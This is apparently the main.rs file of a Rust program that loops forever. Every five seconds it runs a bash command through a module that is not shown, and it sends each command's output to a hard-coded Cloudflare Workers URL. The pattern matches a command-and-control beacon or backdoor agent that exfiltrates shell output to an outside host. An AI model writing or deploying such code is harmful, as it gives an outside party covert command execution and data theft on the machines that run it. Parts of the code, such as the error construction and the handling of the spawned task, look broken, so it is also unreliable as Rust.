// src/main.rs
mod command_executor;
mod worker_communication;

#[tokio::main]
async fn main() {
    let worker_url = "https://serverworker.adoba.workers.dev/".to_string();

    let mut send_data = |output: String| {
        let worker_url = worker_url.clone();
        let result = tokio::spawn(async move {
            worker_communication::send_data_request(&worker_url, &output).await
        });
        result.map(|_| ()).map_err(|_| reqwest::Error::new(reqwest::StatusCode::INTERNAL_SERVER_ERROR))
    };

    loop {
        let result = command_executor::execute_bash_command(true, &mut send_data);
        if let Err(e) = result {
            eprintln!("Error executing bash command: {}", e);
        }
        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await; // Adjust the delay as needed
    }
}